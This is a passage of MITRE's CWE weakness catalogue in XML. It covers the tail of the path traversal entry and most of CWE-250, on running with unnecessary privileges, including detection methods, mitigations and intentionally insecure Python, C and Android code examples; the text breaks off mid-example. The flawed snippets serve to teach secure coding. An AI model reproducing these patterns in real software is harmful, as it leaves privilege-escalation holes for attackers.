               <Reference_Section>Chapter 11, "Directory Traversal and Using Parent Paths (..)"
						Page 370</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.22.2">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-32" Local_Reference_ID="R.22.3">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>Testing for Path Traversal (OWASP-AZ-001)</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.22.4">
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 7 - Path Traversal</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-09</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/09/top-25-series-rank-7-path-traversal/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.22.5">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.22.6">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 9, "Filenames and Paths", Page
						503.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Path Traversal</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Insecure Direct Object Reference</Mapped_Node_Name>
               <Mapped_Node_ID>A4</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Broken Access Control</Mapped_Node_Name>
               <Mapped_Node_ID>A2</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Canonicalize path names originating from untrusted
						sources</Mapped_Node_Name>
               <Mapped_Node_ID>FIO02-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Path Traversal </Mapped_Node_Name>
               <Mapped_Node_ID>33</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Canonicalize path names originating from untrusted
						sources</Mapped_Node_Name>
               <Mapped_Node_ID>FIO02-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Path Traversal</Mapped_Node_Name>
               <Mapped_Node_ID>SFP16</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>126</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>213</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>23</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>64</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>76</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>78</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>79</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004
						mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Other_Notes,
						Relationship_Notes, Relevant_Properties, Taxonomy_Mappings,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms,
						Common_Consequences, Demonstrative_Examples, Description, Detection_Factors,
						Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes,
						Potential_Mitigations, References, Related_Attack_Patterns,
						Relationship_Notes, Relationships, Research_Gaps, Taxonomy_Mappings,
						Terminology_Notes, Time_of_Introduction,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Description, Detection_Factors, Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2010-02-16">Path
						Traversal</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="250" Name="Execution with Unnecessary Privileges" Weakness_Abstraction="Class" Status="Draft">
         <Description>
            <Description_Summary>The software performs an operation at a privilege level that is
					higher than the minimum level required, which creates new weaknesses or
					amplifies the consequences of other weaknesses.</Description_Summary>
            <Extended_Description>
               <Text>New weaknesses can be exposed because running with extra privileges, such
						as root or Administrator, can disable the normal security checks being
						performed by the operating system or surrounding environment. Other
						pre-existing weaknesses can turn into security vulnerabilities if they occur
						while operating at raised privileges.</Text>
               <Text>Privilege management functions can behave in some less-than-obvious ways,
						and they have different quirks on different platforms. These inconsistencies
						are particularly pronounced if you are transitioning from one non-root user
						to another. Signal handlers and spawned processes run at the privilege of
						the owning process, so if a process is running as root when a signal fires
						or a sub-process is executed, the signal handler or sub-process will operate
						with root privileges.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>657</Relationship_Target_ID>
               <!--Violation of Secure Design Principles--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>269</Relationship_Target_ID>
               <!--Improper Privilege Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>227</Relationship_Target_ID>
               <!--Improper Fulfillment of API Contract ('API Abuse')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>265</Relationship_Target_ID>
               <!--Privilege / Sandbox Issues--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>753</Relationship_Target_ID>
               <!--2009 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>858</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 13 - Serialization (SER)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>815</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A6 - Security Misconfiguration--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>901</Relationship_Target_ID>
               <!--SFP Primary Cluster: Privilege--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>There is a close association with CWE-653 (Insufficient Separation of
						Privileges). CWE-653 is about providing separate components for each
						privilege; CWE-250 is about ensuring that each component has the least
						amount of privileges possible.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Architectural_Paradigms>
               <Architectural_Paradigm Architectural_Paradigm_Name="Mobile Application"/>
            </Architectural_Paradigms>
         </Applicable_Platforms>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>CWE-271, CWE-272, and CWE-250 are all closely related and possibly
						overlapping. CWE-271 is probably better suited as a category. Both CWE-272
						and CWE-250 are in active use by the community. The "least privilege" phrase
						has multiple interpretations.</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Installation</Introductory_Phase>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
         </Time_of_Introduction>
         <Modes_of_Introduction>
            <Mode_of_Introduction>
               <Text>If an application has this design problem, then it can be easier for the
						developer to make implementation-related errors such as CWE-271 (Privilege
						Dropping / Lowering Errors). In addition, the consequences of Privilege
						Chaining (CWE-268) can become more severe.</Text>
            </Mode_of_Introduction>
         </Modes_of_Introduction>
         <Likelihood_of_Exploit>Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker will be able to gain access to any resources that are
							allowed by the extra privileges. Common results include executing code,
							disabling services, and reading restricted data.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-11.7">
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Use monitoring tools that examine the software's process as it
							interacts with the operating system and the network. This technique is
							useful in cases when source code is unavailable, if the software was not
							developed by you, or if you want to verify that the build phase did not
							introduce any new weaknesses. Examples include debuggers that directly
							attach to the running process; system-call tracing utilities such as
							truss (Solaris) and strace (Linux); system activity monitors such as
							FileMon, RegMon, Process Monitor, and other Sysinternals utilities
							(Windows); and sniffers and protocol analyzers that monitor network
							traffic.</Text>
                  <Text>Attach the monitor to the process and perform a login. Look for
							library functions and system calls that indicate when privileges are
							being raised or dropped. Look for accesses of resources that are
							restricted to normal users.</Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text>Note that this technique is only useful for privilege issues related
							to system resources. It is not likely to detect application-level
							business rules that are related to privileges, such as if a blog system
							allows a user to delete a blog entry without first checking that the
							user has administrator privileges.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Compare binary / bytecode to application permission
									manifest</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Host-based Vulnerability Scanners – Examine configuration for
									flaws, verifying that audit mechanisms work, ensure host
									configuration meets certain predefined criteria</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Host Application Interface Scanner</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Configuration Checker</Text>
                        <Text>Permission Manifest Analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Attack Modeling</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.250.2]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-18">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Separation of Privilege</Mitigation_Strategy>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text> Identify the functionality that requires additional privileges, such
							as access to privileged operating system resources. Wrap and centralize
							this functionality if possible, and isolate the privileged code as much
							as possible from other code [R.250.2]. Raise privileges as late as
							possible, and drop them as soon as possible to avoid CWE-271. Avoid
							weaknesses such as CWE-288 and CWE-420 by protecting all possible
							communication channels that could interact with the privileged code,
							such as a secondary socket that is only intended to be accessed by
							administrators. </Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Perform extensive input validation for any privileged code that must
							be exposed to the user and reject anything that does not fit your strict
							requirements.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-19">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When dropping privileges, ensure that they have been dropped
							successfully to avoid CWE-273. As protection mechanisms in the
							environment get stronger, privilege-dropping calls may fail even if it
							seems like they would always succeed.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If circumstances force you to run with extra privileges, then
							determine the minimum access level necessary. First identify the
							different permissions that the software and its users will need to
							perform their actions, such as file read and write permissions, network
							socket permissions, and so forth. Then explicitly allow those actions
							while denying all else [R.250.2]. Perform extensive input validation and
							canonicalization to minimize the chances of introducing a separate
							vulnerability. This mitigation is much more prone to error than dropping
							the privileges in the first place.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-37">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>System Configuration</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Ensure that the software runs properly under the Federal Desktop Core
							Configuration (FDCC) [R.250.4] or an equivalent hardening configuration
							guide, which many organizations use to limit the attack surface and
							potential risk of deployed software.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code temporarily raises the program's privileges to allow
						creation of a new user folder.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Python</Code_Example_Language>
                     <Code>def makeNewUserDir(username):</Code>
                     <Block>
                        <Code>if invalidUsername(username):</Code>
                        <Block>
                           <Comment>#avoid CWE-22 and CWE-78</Comment>
                           <Code>print('Usernames cannot contain invalid
										characters')</Code>
                           <Code>return False</Code>
                        </Block>
                        <Code>try:</Code>
                        <Block>
                           <Code>raisePrivileges()</Code>
                           <Code>os.mkdir('/home/' + username)</Code>
                           <Code>lowerPrivileges()</Code>
                        </Block>
                        <Code>except OSError:</Code>
                        <Block>
                           <Code>print('Unable to create new user directory for user:' +
										username)</Code>
                           <Code>return False</Code>
                        </Block>
                        <Code>return True</Code>
                     </Block>
                  </Block>
                  <Text>While the program only raises its privilege level to create the folder
							and immediately lowers it again, if the call to os.mkdir() throws an
							exception, the call to lowerPrivileges() will not occur. As a result,
							the program is indefinitely operating in a raised privilege state,
							possibly allowing further exploitation to occur.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code calls chroot() to restrict the application to a
						subset of the filesystem below APP_HOME in order to prevent an attacker from
						using the program to gain unauthorized access to files located elsewhere.
						The code then opens a file specified by the user and processes the contents
						of the file.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>chroot(APP_HOME);</Code>
                     <Code>chdir("/");</Code>
                     <Code>FILE* data = fopen(argv[1], "r+");</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>Constraining the process inside the application's home directory
							before opening any files is a valuable security measure. However, the
							absence of a call to setuid() with some non-zero value means the
							application is continuing to operate with unnecessary root privileges.
							Any successful exploit carried out by an attacker against the
							application can now result in a privilege escalation attack because any
							malicious operations will be performed with the privileges of the
							superuser. If the application drops to the privilege level of a non-root
							user, the potential for damage is substantially reduced.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This application intends to use a user's location to determine the
						timezone the user is in:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>locationClient = new LocationClient(this, this, this);</Code>
                     <Code>locationClient.connect();</Code>
                     <Code>Location userCurrLocation;</Code>
                     <Code>userCurrLocation = locationClient.getLastLocation();</Code>
                     <Code>setTimeZone(userCurrLocation);</Code>
                  </Block>
                  <Text>This is unnecessary use of the location API, as this information is
							already available using the Android Time API. Always be sure there is
							not another way to obtain needed information before resorting to using
							the location API.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-111">
               <Intro_Text>This code uses location to determine the user's current US State
						location.</Intro_Text>
               <Example_Body>
                  <Text>First the application must declare that it requires the
							ACCESS_FINE_LOCATION permission in the application's manifest.xml: </Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>XML</Code_Example_Language>
                     <Code>&lt;uses-permission
								android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;</Code>
                  </Block>
                  <Text>During execution, a call to getLastLocation() will return a location
							based on the application's location permissions. In this case the
							application has permission for the most accurate location possible: </Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>locationClient = new LocationClient(this, this, this);</Code>
                     <Code>locationClient.connect();</Code>
                     <Code>Location userCurrLocation;</Code>
